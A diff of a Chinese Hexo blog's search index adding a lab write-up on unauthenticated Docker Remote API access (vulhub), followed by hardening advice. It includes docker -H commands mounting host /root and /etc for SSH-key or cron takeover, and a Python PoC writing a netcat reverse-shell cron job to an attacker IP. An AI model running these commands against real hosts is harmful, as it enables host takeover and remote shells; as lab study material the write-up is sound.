@@ -62,6 +62,75 @@
       </tags>
   </entry>
   <entry>
+    <title>Docker 未授权访问</title>
+    <url>/2023/05/18/Docker/</url>
+    <content><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>奇奇怪怪</p>
+</div>
+
+<div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
+</div>
+
+<div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>新的一天开始了</p>
+</div>
+
+<div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
+</div>
+
+<div class="timeline red"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p>
+</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-18</p>
+</div></div><div class='timeline-item-content'><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><ul>
+<li>Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell</li>
+</ul>
+<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><ul>
+<li>vulhub靶场环境</li>
+<li>docker-compose build<br>docker-compose up -d</li>
+<li>环境启动后，将监听2375端口。</li>
+<li>测试多个环境启动失败，最后使用官方靶场推荐环境，ubuntu20.04 正常启动</li>
+</ul>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[http://xxx:2375/version](http://xxx:2375/version)  查看版本信息</span><br><span class="line">http://xxx:2375/info  查看info信息</span><br><span class="line">http://host:2375/containers/json 当前服务器运行容器列表信息</span><br><span class="line"></span><br><span class="line">使用命令远程连接目标执行docker 指令</span><br><span class="line">docker -H tcp://xxx:2375 images 返回远程目标的 images 信息，也可以执行其他docker命令</span><br><span class="line"></span><br><span class="line">**获取宿主机权限**</span><br><span class="line"></span><br><span class="line">远程命令运行容器并且使用 -v 参数将宿主机 /root 目录挂载到容器 /mnt/setc 目录</span><br><span class="line">随后可以将生成 ssh 公钥私钥，将公钥写入目标 /root/.ssh/authorized_keys 文件</span><br><span class="line">随后使用私钥登陆</span><br><span class="line">docker -H tcp://192.168.56.117:2375 run -it -v /root:/mnt/setc alpine:latest /bin/sh</span><br><span class="line"></span><br><span class="line">远程命令运行容器使用 -v 参数将宿主机 /etc 目录挂载到容器 /mnt/setc 目录</span><br><span class="line">随后写入定时任务命令反弹shell</span><br><span class="line">/etc/crontab   ,也可以挂载 /var/spool/cron/ 写入定时任务反弹shell</span><br><span class="line">docker -H tcp://192.168.56.117:2375 run -it -v /etc:/mnt/setc alpine:latest /bin/sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">py poc 代码</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">import docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=<span class="string">&#x27;http://192.168.56.117:2375/&#x27;</span>)</span><br><span class="line">data = client.containers.run(<span class="string">&#x27;alpine:latest&#x27;</span>, r<span class="string">&#x27;&#x27;</span><span class="string">&#x27;sh -c &quot;echo &#x27;</span>* * * * * /usr/bin/nc 192.168.56.1 1111 -e /bin/sh<span class="string">&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;</span><span class="string">&#x27;&#x27;</span>, remove=True, volumes=&#123;<span class="string">&#x27;/etc&#x27;</span>: &#123;<span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/tmp/etc&#x27;</span>, <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title="漏洞加固"></a>漏洞加固</h1><ul>
+<li>在不必需的情况下，不要启用 docker 的 remote api 服务，如果必须使用的话，可以采用如下的加固方式：</li>
+<li>设置 ACL，仅允许信任的来源 IP 连接；</li>
+<li>设置 TLS 认证，官方的文档为 Protect the Docker daemon socket</li>
+<li>客户端连接时需要设置以下环境变量 export DOCKER_TLS_VERIFY&#x3D;1</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export DOCKER_CERT_PATH=~/.docker</span><br><span class="line">export DOCKER_HOST=tcp://10.10.10.10:2375</span><br><span class="line">export DOCKER_API_VERSION=1.12</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在 docker api 服务器前面加一个代理，例如 nginx，设置 401 认证</li>
+</ul>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><a href="https://paper.seebug.org/409/#0x010-docker">https://paper.seebug.org/409/#0x010-docker</a></li>
+<li><a href="https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md</a></li>
+<li><a href="https://0a00.github.io/2022/11/26/docker1/">https://0a00.github.io/2022/11/26/docker1/</a></li>
+</ul>
+</div></div></div>
+
+<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p>
+</div>
+
+<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
+</div>
+
+<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
+</div>
+
+]]></content>
+      <categories>
+        <category>未授权访问</category>
+        <category>Docker</category>
+      </categories>
+      <tags>
+        <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ElasticSearch 未授权访问</title>
     <url>/2023/05/16/ElasticSearch/</url>
     <content><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>方糖的博客</p>
@@ -641,6 +710,16 @@
 ]]></content>
   </entry>
   <entry>
+    <title>  </title>
+    <url>/archlinux/index.html</url>
+    <content><![CDATA[<div class="note blue icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>arch linux 一个很棒的linux发行版</p>
+</div>
+
+
+
+]]></content>
+  </entry>
+  <entry>
     <title>书籍</title>
     <url>/books/index.html</url>
     <content><![CDATA[<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
@@ -666,16 +745,6 @@
 
 <div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
 </div>
-
-]]></content>
-  </entry>
-  <entry>
-    <title>  </title>
-    <url>/archlinux/index.html</url>
-    <content><![CDATA[<div class="note blue icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>arch linux 一个很棒的linux发行版</p>
-</div>
-
-
 
 ]]></content>
   </entry>
@@ -739,6 +808,11 @@
     <content><![CDATA[]]></content>
   </entry>
   <entry>
+    <title>标签</title>
+    <url>/tags/index.html</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>音乐</title>
     <url>/music/index.html</url>
     <content><![CDATA[<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-music"></i><p>恋恋风尘-程壁</p>
@@ -764,11 +838,6 @@
 
 
 ]]></content>
-  </entry>
-  <entry>
-    <title>标签</title>
-    <url>/tags/index.html</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>图库</title>
